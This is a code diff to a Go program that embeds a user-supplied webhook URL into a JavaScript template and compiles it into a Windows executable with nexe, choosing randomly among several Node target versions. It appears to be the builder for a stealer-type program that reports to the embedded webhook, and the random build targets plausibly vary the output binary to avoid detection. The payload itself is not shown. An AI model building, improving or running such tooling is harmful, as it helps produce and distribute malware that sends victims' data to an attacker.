@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -20,6 +21,8 @@ func main() {
 }
 
 func build(webhook string) {
+	rand.Seed(time.Now().Unix())
+
 	logger.Info("Starting to compile")
 	// Check for node
 	_, err := exec.Command("node", "-v").Output()
@@ -38,12 +41,12 @@ func build(webhook string) {
 		os.Exit(1)
 	}
 	// Check pkg
-	_, err = exec.Command("pkg", "-v").Output()
+	_, err = exec.Command("nexe", "-v").Output()
 	if err != nil {
-		logger.Info("Installing pkg")
-		_, err = exec.Command("npm", "install", "-g", "pkg").Output()
+		logger.Info("Installing nexe")
+		_, err = exec.Command("npm", "install", "-g", "nexe").Output()
 		if err != nil {
-			logger.Fatal(`Error while installing pkg, "npm install -g pkg", run this command in cmd please. Will exit in 5 seconds`, err)
+			logger.Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
 			time.Sleep(5 * time.Second)
 			os.Exit(1)
 		}
@@ -70,7 +73,6 @@ func build(webhook string) {
 	//replace webhook
 
 	c := strings.Replace(string(r), "da_webhook", webhook, -1)
-
 	err = ioutil.WriteFile("index.js", []byte(c), 0666)
 	if err != nil {
 		logger.Fatal("Error writing to file", err)
@@ -78,22 +80,18 @@ func build(webhook string) {
 	time.Sleep(time.Second)
 
 	// Compile it
-	_, err = exec.Command("pkg", "index.js").Output()
+	versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1", "win32-x64-12.9.1"}
+	v := versions[rand.Intn(len(versions))]
+	t := fmt.Sprintf(`-t %s`, v)
+	logger.Info(fmt.Sprintf(`Compiling: nexe %s index.js`, t))
+	_, err = exec.Command("nexe", t, "index.js").Output()
 	if err != nil {
 		logger.Fatal("Error while compiling", err)
 		time.Sleep(5 * time.Second)
 		os.Exit(1)
 	}
-	logger.Info("Program have been compiled with your webhook")
+	logger.Info("\nProgram have been compiled with your webhook")
 	err = os.Remove("index.js")
-	if err != nil {
-		logger.Fatal(err)
-	}
-	err = os.Remove("index-macos")
-	if err != nil {
-		logger.Fatal(err)
-	}
-	err = os.Remove("index-linux")
 	if err != nil {
 		logger.Fatal(err)
 	}
